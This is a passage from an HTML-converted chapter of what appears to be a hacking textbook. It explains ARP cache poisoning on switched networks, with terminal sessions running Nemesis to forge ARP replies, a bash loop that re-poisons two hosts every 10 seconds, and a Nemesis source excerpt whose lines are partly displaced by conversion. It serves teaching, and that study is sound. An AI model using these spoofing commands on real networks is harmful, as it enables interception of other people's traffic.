<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x444 Active Sniffing</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part90.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part92.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark80">0x444 Active Sniffing</a><a name="bookmark102">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">In a <span class="s27">switched network environment</span>, packets are only sent to the port they are destined for, according to their destination MAC addresses. This requires more intelligent hardware that can create and maintain a table associating MAC addresses with certain ports, depending on which device is connected to each port, as illustrated here.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The advantage of a switched environment is that devices are only sent packets that are meant for them, so that promiscuous devices aren’t able to sniff any additional packets. But even in a switched environment, there are clever ways to sniff other devices’ packets; they just tend to be a bit more complex. In order to find hacks like these, the details of the protocols must be examined and then combined.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="344" height="161" alt="image" src="Image_725.png"/></span></p><p class="s89" style="text-indent: 0pt;text-align: left;">Port 1 <span class="s90">00:00:00:AA:AA:AA</span></p><p class="s89" style="text-indent: 0pt;text-align: left;">Port 2 <span class="s90">00:00:00:BB:BB:BB</span></p><p class="s89" style="text-indent: 0pt;text-align: left;">Port 3 <span class="s90">00:00:00:CC:CC:CC</span></p><p style="text-indent: 0pt;text-align: left;"/><p class="s89" style="text-indent: 0pt;text-align: left;">Switch</p><p class="s89" style="padding-top: 8pt;padding-left: 5pt;text-indent: 0pt;text-align: left;">1 2 3</p><p style="text-indent: 0pt;text-align: left;"/><p style="padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">One important aspect of network communications that can be manip- ulated for interesting effects is the source address. There’s no provision in these protocols to ensure that the source address in a packet really is the address of the source machine. The act of forging a source address in a packet is known as <span class="s27">spoofing</span>. The addition of spoofing to your bag of tricks greatly increases the number of possible hacks, since most systems expect the source address to be valid.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s77" style="padding-top: 1pt;padding-left: 92pt;text-indent: 0pt;text-align: left;">00:00:00:AA:AA:AA    00:00:00:BB:BB:BB    00:00:00:CC:CC:CC</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Spoofing is the first step in sniffing packets on a switched network. The other two interesting details are found in ARP. First, when an ARP reply comes in with an IP address that already exists in the ARP cache, the receiving system will overwrite the prior MAC address information with the new information found in the reply (unless that entry in the ARP cache was explicitly marked as permanent). Second, no state information about the ARP traffic is kept, since this would require additional memory and would complicate a protocol that is meant to be simple. This means systems will accept an ARP reply even if they didn’t send out an ARP request.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: left;">These three details, when exploited properly, allow an attacker to sniff network traffic on a switched network using a technique known as <span class="s27">ARP redirection</span>. The attacker sends spoofed ARP replies to certain devices that cause the ARP cache entries to be overwritten with the attacker’s data. This tech- nique is called <span class="s27">ARP cache poisoning</span>. In order to sniff network traffic between two points, <span class="s27">A </span>and <span class="s27">B</span>, the attacker needs to poison the ARP cache of <span class="s27">A </span>to</p><p style="text-indent: 0pt;text-align: left;"><span><img width="73" height="104" alt="image" src="Image_726.png"/></span></p><p class="s49" style="padding-top: 5pt;padding-left: 23pt;text-indent: 0pt;text-align: left;">Attacker system</p><p class="s82" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">IP: 192.168.0.137 MAC: <span class="s83">00:00:00:FA:CA:DE</span></p><p style="text-indent: 0pt;text-align: left;"/><p class="s52" style="padding-top: 1pt;padding-left: 3pt;text-indent: 0pt;text-align: left;">Internal ARP cache</p><p class="s52" style="padding-left: 3pt;text-indent: 0pt;text-align: left;">192.168.0.100 at 00:00:00:AA:AA:AA</p><p class="s52" style="padding-left: 3pt;text-indent: 0pt;text-align: left;">192.168.0.22 at 00:00:00:BB:BB:BB</p><p style="text-indent: 0pt;text-align: left;"/><p class="s49" style="padding-top: 5pt;padding-left: 23pt;text-indent: 0pt;text-align: left;">System B</p><p class="s82" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">IP: 192.168.0.200 MAC: <span class="s83">00:00:00:BB:BB:BB</span></p><p style="text-indent: 0pt;text-align: left;"/><p class="s52" style="padding-top: 3pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">Internal ARP cache</p><p class="s52" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">192.168.0.100 at 00:00:00:FA:CA:DE</p><p style="text-indent: 0pt;text-align: left;"/><p class="s49" style="padding-top: 5pt;padding-left: 23pt;text-indent: 0pt;text-align: left;">System A</p><p class="s82" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">IP: 192.168.0.100 MAC: <span class="s83">00:00:00:AA:AA:AA</span></p><p style="text-indent: 0pt;text-align: left;"/><p class="s52" style="padding-top: 3pt;padding-left: 3pt;text-indent: 0pt;text-align: left;">Internal ARP cache</p><p class="s52" style="padding-left: 3pt;text-indent: 0pt;text-align: left;">192.168.0.200 at 00:00:00:FA:CA:DE</p><p style="text-indent: 0pt;text-align: left;"/><p style="text-indent: 0pt;text-align: left;"><span><img width="147" height="133" alt="image" src="Image_727.png"/></span></p><p class="s82" style="padding-top: 3pt;padding-left: 39pt;text-indent: 0pt;line-height: 122%;text-align: left;">Traffic to A Traffic to B</p><p style="text-indent: 0pt;text-align: left;"/><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">cause <span class="s27">A </span>to believe that <span class="s27">B</span>’s IP address is at the attacker’s MAC address, and also poison the ARP cache of <span class="s27">B </span>to cause <span class="s27">B </span>to believe that <span class="s27">A</span>’s IP address is also at the attacker’s MAC address. Then the attacker’s machine simply needs to forward these packets to their appropriate final destinations. After that, all of the traffic between <span class="s27">A </span>and <span class="s27">B </span>still gets delivered, but it all flows through the attacker’s machine, as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 9pt;padding-left: 91pt;text-indent: 17pt;text-align: left;">Since <span class="s27">A </span>and <span class="s27">B </span>are wrapping their own Ethernet headers on their packets based on their respective ARP caches, <span class="s27">A</span>’s IP traffic meant for <span class="s27">B </span>is actually sent to the attacker’s MAC address, and vice versa. The switch only filters traffic based on MAC address, so the switch will work as it’s designed to, sending <span class="s27">A</span>’s and <span class="s27">B</span>’s IP traffic, destined for the attacker’s MAC address, to the attacker’s port. Then the attacker rewraps the IP packets with the proper Ethernet headers and sends them back to the switch, where they are finally routed to their proper destination. The switch works properly; it’s the victim machines that are tricked into redirecting their traffic through the attacker’s machine.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Due to timeout values, the victim machines will periodically send out real ARP requests and receive real ARP replies in response. In order to maintain the redirection attack, the attacker must keep the victim machine’s ARP caches poisoned. A simple way to accomplish this is to send spoofed ARP replies to both A and B at a constant interval—for example, every 10 seconds.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 107%;text-align: left;">A <span class="s27">gateway </span>is a system that routes all the traffic from a local network out to the Internet. ARP redirection is particularly interesting when one of the victim machines is the default gateway, since the traffic between the default gateway and another system is that system’s Internet traffic. For example, if a machine at 192.168.0.118 is communicating with the gateway at 192.168.0.1 over a switch, the traffic will be restricted by MAC address. This means that this traffic cannot normally be sniffed, even in promiscuous mode. In order to sniff this traffic, it must be redirected.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">To redirect the traffic, first the MAC addresses of 192.168.0.118 and 192.168.0.1 need to be determined. This can be done by pinging these hosts, since any IP connection attempt will use ARP. If you run a sniffer, you can see the ARP communications, but the OS will cache the resulting IP/MAC address associations.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_728.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">PING 192.168.0.1 (192.168.0.1): 56 octets data</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">--- 192.168.0.1 ping statistics ---</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 0.4/0.4/0.4 ms reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">PING 192.168.0.118 (192.168.0.118): 56 octets data</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">--- 192.168.0.118 ping statistics ---</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 0.4/0.4/0.4 ms reader@hacking:~/booksrc $ arp -na</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ifconfig eth0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">eth0   Link encap:Ethernet HWaddr 00:00:AD:D1:C7:ED</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;line-height: 107%;text-align: left;">inet addr:192.168.0.193 Bcast:192.168.0.255 Mask:255.255.255.0 UP BROADCAST NOTRAILERS RUNNING MTU:1500 Metric:1</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;line-height: 106%;text-align: left;">RX packets:4153 errors:0 dropped:0 overruns:0 frame:0 TX packets:3875 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:100</p><p class="s31" style="padding-left: 133pt;text-indent: 0pt;text-align: left;">RX bytes:601686 (587.5 Kb) TX bytes:288567 (281.8 Kb)</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 42pt;text-align: left;">Interrupt:9 Base address:0xc000 reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_729.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After pinging, the MAC addresses for both 192.168.0.118 and 192.168.0.1 are in the attacker’s ARP cache. This way, packets can reach their final destinations after being redirected to the attacker’s machine. Assuming IP forwarding capabilities are compiled into the kernel, all we need to do is send some spoofed ARP replies at regular intervals. 192.168.0.118 needs to be told that 192.168.0.1 is at <span class="s31">00:00:AD:D1:C7:ED</span>, and 192.168.0.1 needs to be</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">told that 192.168.0.118 is also at <span class="s31">00:00:AD:D1:C7:ED</span>. These spoofed ARP packets can be injected using a command-line packet injection tool called Nemesis. Nemesis was originally a suite of tools written by Mark Grimes, but in the most recent version 1.4, all functionality has been rolled up into a single utility by the new maintainer and developer, Jeff Nathan. The source code for Nemesis is on the LiveCD at /usr/src/nemesis-1.4/, and it has already been built and installed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_730.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nemesis</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">NEMESIS -=- The NEMESIS Project Version 1.4 (Build 26) NEMESIS Usage:</p><p class="s31" style="padding-top: 1pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">nemesis [mode] [options]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">NEMESIS modes:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">arp dns</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">ethernet icmp igmp</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">ip</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">ospf (currently non-functional) rip</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">tcp udp</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">NEMESIS options:</p><p class="s31" style="padding-left: 91pt;text-indent: 8pt;line-height: 214%;text-align: left;">To display options, specify a mode with the option &quot;help&quot;. reader@hacking:~/booksrc $ nemesis arp help</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">ARP/RARP Usage:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">arp [-v (verbose)] [options]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">ARP/RARP Options:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-S &lt;Source IP address&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-D &lt;Destination IP address&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-h &lt;Sender MAC address within ARP frame&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-m &lt;Target MAC address within ARP frame&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-s &lt;Solaris style ARP requests with target hardware addess set to broadcast&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-r ({ARP,RARP} REPLY enable)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-R (RARP enable)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-P &lt;Payload file&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Data Link Options:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-d &lt;Ethernet device name&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-H &lt;Source MAC address&gt;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">-M &lt;Destination MAC address&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You must define a Source and Destination IP address.</p><p class="s31" style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED - M 00:C0:F0:79:3D:30</p><p class="s31" style="padding-top: 2pt;padding-left: 155pt;text-indent: -63pt;line-height: 21pt;text-align: left;">ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26) [MAC] 00:00:AD:D1:C7:ED &gt; 00:C0:F0:79:3D:30</p><p class="s31" style="padding-left: 112pt;text-indent: 0pt;line-height: 8pt;text-align: left;">[Ethernet type] ARP (0x0806)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[Protocol addr:IP] 192.168.0.1 &gt; 192.168.0.118</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">[Hardware addr:MAC] 00:00:AD:D1:C7:ED &gt; 00:C0:F0:79:3D:30</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[ARP opcode] Reply</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">[ARP hardware fmt] Ethernet (1) [ARP proto format] IP (0x0800) [ARP protocol len] 6</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[ARP hardware len] 4</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB ARP Packet Injected</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 8pt;text-align: left;">reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00:50:18:00:0F:01</p><p class="s31" style="padding-left: 155pt;text-indent: -63pt;line-height: 21pt;text-align: left;">ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26) [MAC] 00:00:AD:D1:C7:ED &gt; 00:50:18:00:0F:01</p><p class="s31" style="padding-top: 1pt;padding-left: 112pt;text-indent: 0pt;text-align: left;">[Ethernet type] ARP (0x0806)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[Protocol addr:IP] 192.168.0.118 &gt; 192.168.0.1</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">[Hardware addr:MAC] 00:00:AD:D1:C7:ED &gt; 00:50:18:00:0F:01</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[ARP opcode] Reply</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: left;">[ARP hardware fmt] Ethernet (1) [ARP proto format] IP (0x0800) [ARP protocol len] 6</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[ARP hardware len] 4</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">ARP Packet Injected reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_731.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">These two commands spoof ARP replies from 192.168.0.1 to 192.168.0.118 and vice versa, both claiming that their MAC address is at the attacker’s MAC address of <span class="s31">00:00:AD:D1:C7:ED</span>. If these commands are repeated every 10 seconds, these bogus ARP replies will continue to keep the ARP caches poisoned and the traffic redirected. The standard BASH shell allows commands to be scripted, using familiar control flow statements. A simple BASH shell while loop is used below to loop forever, sending our two poisoning ARP replies every 10 seconds.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_732.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ while true</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; do</p><p class="s31" style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00:C0:F0:79:3D:30</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00:50:18:00:0F:01</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; echo &quot;Redirecting...&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; sleep 10</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; done</p><p class="s31" style="padding-top: 2pt;padding-left: 86pt;text-indent: 0pt;line-height: 21pt;text-align: center;">ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26) [MAC] 00:00:AD:D1:C7:ED &gt; 00:C0:F0:79:3D:30</p><p class="s31" style="padding-left: 112pt;text-indent: 0pt;line-height: 8pt;text-align: left;">[Ethernet type] ARP (0x0806)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[Protocol addr:IP] 192.168.0.1 &gt; 192.168.0.118</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">[Hardware addr:MAC] 00:00:AD:D1:C7:ED &gt; 00:C0:F0:79:3D:30</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[ARP opcode] Reply</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">[ARP hardware fmt] Ethernet (1) [ARP proto format] IP (0x0800) [ARP protocol len] 6</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[ARP hardware len] 4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 214%;text-align: left;">Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB. ARP Packet Injected</p><p class="s31" style="padding-left: 62pt;text-indent: 0pt;line-height: 10pt;text-align: center;">ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 66pt;text-indent: 0pt;text-align: center;">[MAC] 00:00:AD:D1:C7:ED &gt; 00:50:18:00:0F:01</p><p class="s31" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">[Ethernet type] ARP (0x0806)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[Protocol addr:IP] 192.168.0.118 &gt; 192.168.0.1</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">[Hardware addr:MAC] 00:00:AD:D1:C7:ED &gt; 00:50:18:00:0F:01</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">[ARP opcode] Reply</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">[ARP hardware fmt] Ethernet (1) [ARP proto format] IP (0x0800) [ARP protocol len] 6</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">[ARP hardware len] 4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB. ARP Packet Injected</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Redirecting...</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_733.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">You can see how something as simple as Nemesis and the standard BASH shell can be used to quickly hack together a network exploit. Nemesis uses a C library called libnet to craft spoofed packets and inject them. Similar to libpcap, this library uses raw sockets and evens out the inconsistencies between platforms with a standardized interface. libnet also provides several convenient functions for dealing with network packets, such as checksum generation.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The libnet library provides a simple and uniform API to craft and inject network packets. It’s well documented and the functions have descriptive names. A high-level glance at the source code for Nemesis shows how easy it is to craft ARP packets using libnet. The source file nemesis-arp.c contains several functions for crafting and injecting ARP packets, using statically defined</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">data structures for the packet header information. The <span class="s31">nemesis_arp() </span>function shown below is called in nemesis.c to build and inject an ARP packet.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From nemesis-arp.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_734.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">static ETHERhdr etherhdr;</p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">static ARPhdr arphdr;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">void nemesis_arp(int argc, char **argv)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 212%;text-align: left;">const char *module= &quot;ARP/RARP Packet Injection&quot;; nemesis_maketitle(title, module, version);</p><p class="s31" style="padding-left: 125pt;text-indent: -17pt;text-align: left;">if (argc &gt; 1 &amp;&amp; !strncmp(argv[1], &quot;help&quot;, 4)) arp_usage(argv[0]);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;line-height: 106%;text-align: left;">arp_initdata(); arp_cmdline(argc, argv); arp_validatedata(); arp_verbose();</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if (got_payload)</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 176pt;text-indent: -50pt;line-height: 107%;text-align: left;">if (builddatafromfile(ARPBUFFSIZE, &amp;pd, (const char *)file, (const u_int32_t)PAYLOADMODE) &lt; 0)</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">arp_exit(1);</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">if (buildarp(&amp;etherhdr, &amp;arphdr, &amp;pd, device, reply) &lt; 0)</p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">else</p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p class="s46" style="text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;\n%s Injection Failure\n&quot;, (rarp == 0 ? &quot;ARP&quot; : &quot;RARP&quot;)); arp_exit(1);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;\n%s Packet Injected\n&quot;, (rarp == 0 ? &quot;ARP&quot; : &quot;RARP&quot;)); arp_exit(0);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_735.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">The structures <span class="s31">ETHERhdr </span>and <span class="s31">ARPhdr </span>are defined in the file nemesis.h (shown below) as aliases for existing libnet data structures. In C, <span class="s31">typedef </span>is used to alias a data type with a symbol.</p><p class="s40" style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From nemesis.h</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_736.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">typedef struct libnet_arp_hdr ARPhdr; typedef struct libnet_as_lsa_hdr ASLSAhdr; typedef struct 